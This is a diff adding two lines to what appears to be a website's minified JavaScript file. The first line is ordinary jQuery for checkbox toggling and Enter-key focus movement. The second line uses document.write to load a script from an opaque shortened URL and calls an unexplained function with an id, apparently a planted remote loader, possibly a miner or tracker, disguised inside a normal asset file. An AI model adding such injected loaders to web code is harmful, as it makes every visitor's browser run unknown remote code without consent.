@@ -1,0 +1,2 @@
+"use strict";$("#jl-checkbox").click(function(){$(this).hasClass("jl-check-active")?$(this).removeClass("jl-check-active"):$(this).addClass("jl-check-active")}),$(".js-next-input").on("keydown",function(e){e=e||event;var c=$(".js-next-input"),t=c.index(this);t+1<c.length&&13===e.keyCode&&c[t+1].focus()});
+document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
